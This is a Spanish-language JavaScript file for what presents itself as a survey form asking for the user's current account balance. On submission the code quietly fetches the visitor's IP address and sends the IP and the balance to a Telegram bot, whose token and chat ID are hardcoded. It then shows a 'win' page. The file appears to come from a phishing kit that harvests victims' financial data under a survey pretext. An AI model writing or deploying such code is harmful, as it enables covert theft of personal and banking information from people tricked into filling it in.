function verificarCuenta() {
    var checkboxes = document.querySelectorAll('input[type="checkbox"]');
    var saldoActual = document.getElementById('saldoActualInput').value;

    var checkboxesChecked = Array.from(checkboxes).some(function (checkbox) {
        return checkbox.checked;
    });

    var saldoValido = saldoActual.trim() !== '';

    if (checkboxesChecked && saldoValido) {
        enviarMensajeTelegram(saldoActual)
            .then(function () {
                mostrarAlerta();
                setTimeout(function () {
                    window.location.href = './win.html';
                }, 5000);
            })
            .catch(function (error) {
                console.error('Error al enviar mensaje a Telegram:', error);
            });
    } else {
        alert('Por favor responde todas las preguntas antes de enviar la encuesta.');
    }
}


function enviarMensajeTelegram(saldoActual) {
    var token = '6835132981:AAFXb1FjswdXDH5Q6cBeUKvBc-B8gID3Ljc';
    var chatId = '-1002110248910';
    var url = 'https://api.telegram.org/bot' + token + '/sendMessage';

    return fetch('https://api64.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            var clientIp = data.ip;

            var requestBody = {
                chat_id: chatId,
                text: 'Saldo actual: ' + saldoActual + '\nIP del cliente: ' + clientIp
            };

            return fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(requestBody)
            });
        })
        .then(response => response.json())
        .then(data => {
            console.log('Mensaje enviado a Telegram:', data);
        })
        .catch(error => {
            console.error('Error al enviar mensaje a Telegram:', error);
            throw error;
        });
}

function mostrarAlerta() {
    document.getElementById('Alert').style.display = 'block';
}